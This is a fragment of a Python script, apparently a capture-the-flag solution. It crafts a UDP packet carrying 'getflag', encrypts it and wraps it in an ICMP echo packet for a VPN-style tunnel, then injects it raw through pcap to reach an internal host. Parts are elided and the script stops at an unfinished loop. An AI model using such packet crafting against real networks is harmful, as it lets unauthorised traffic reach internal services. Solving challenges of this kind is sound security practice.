...
if __name__ == '__main__':
    ...
    my_mac = 'bc:54:2f:cb:7b:2c'  # use ifconfig | ip link to find your mac
    srv_mac = 'd8:3b:bf:21:c0:8c'  # use arp -a | ip neigh to find my mac... or your router's mac in case of WSL
    interface = 'wlp41s0'  # your interface connected to the network
    ...
    # create UDP packet
    _data = b'getflag\n'
    udp_hdr = struct.pack("!HHHH", 8321, 8888, 8 + len(_data), 0)
    ip_hdr = proto.pack_ip_header(vpn_ip, '192.168.254.1', 17, 20 + len(udp_hdr) + len(_data))
    packet = proto.repack_packet_with_checksum(ip_hdr + udp_hdr + _data)
    _len = struct.pack("!H", len(packet))
    # encrypt and put it into ICMP packet
    packet = proto.encrypt_bytes(packet, vpn_key)
    icmp_packet = proto.pack_icmp(8, 0, 65535, 65535, _len + packet)
    ip_hdr = proto.pack_ip_header(my_ip, vpn_server_ip, 1, 20 + len(icmp_packet))
    pcap.inject_packet(eth_hdr + ip_hdr + icmp_packet)
    while True:
